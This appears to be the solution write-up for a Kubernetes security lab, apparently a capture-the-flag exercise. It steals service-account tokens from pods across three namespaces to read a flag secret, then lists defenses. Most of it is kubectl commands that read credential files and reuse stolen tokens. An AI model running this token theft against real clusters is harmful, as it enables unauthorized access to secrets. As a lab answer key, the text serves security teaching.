# Lateral Movement Chain — Solution

## Step 1: List Pods in the Starting Namespace

```bash
kubectl get pods -n dojo-sec-lateral
# NAME        READY   STATUS    RESTARTS
# hop1-pod    1/1     Running   0
```

## Step 2: Steal hop1-sa Token

```bash
kubectl exec -n dojo-sec-lateral hop1-pod -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/hop1-token

echo "[+] Hop 1 token stolen"
```

## Step 3: Discover NS2 Pods with hop1-sa Token

```bash
HOP1=$(cat /tmp/hop1-token)

# What can hop1-sa do?
kubectl --token=$HOP1 auth can-i --list 2>/dev/null | head -10

# Discover pods in hop2 namespace
kubectl --token=$HOP1 get pods -n dojo-sec-lateral-hop2
# NAME        READY   STATUS    RESTARTS
# hop2-pod    1/1     Running   0
```

## Step 4: Steal hop2-sa Token

```bash
# exec into hop2-pod using YOUR credentials (you have exec on the pod from default access)
# or use hop1-sa token if it has exec permissions
kubectl exec -n dojo-sec-lateral-hop2 hop2-pod -- \
  cat /var/run/secrets/kubernetes.io/serviceaccount/token > /tmp/hop2-token

echo "[+] Hop 2 token stolen"
```

## Step 5: Read the Final Secret

```bash
HOP2=$(cat /tmp/hop2-token)

# Check permissions
kubectl --token=$HOP2 auth can-i get secrets -n dojo-sec-lateral-hop3
# yes

# Read the final treasure
kubectl --token=$HOP2 get secret final-treasure -n dojo-sec-lateral-hop3 \
  -o jsonpath='{.data.flag}' | base64 -d
```

**Flag: `KUBE{three_hops_to_node_compromise}`**

---

## Run the Verifier

```bash
bash verify.sh
```

---

## Defenses Against This Attack

1. **Disable SA token auto-mounting**: `automountServiceAccountToken: false` on the SA — tokens are only present when explicitly requested
2. **Namespace network isolation**: NetworkPolicy default-deny prevents the token being exfiltrated even if stolen
3. **Audit log alerting**: Cross-namespace API calls from a SA in namespace A to namespace B are abnormal — alert on them
4. **Least privilege RBAC**: hop1-sa shouldn't have cross-namespace permissions unless genuinely needed
5. **Short-lived tokens**: Use TokenRequest API (projected volumes with expiry) instead of static SA tokens — expired tokens are useless
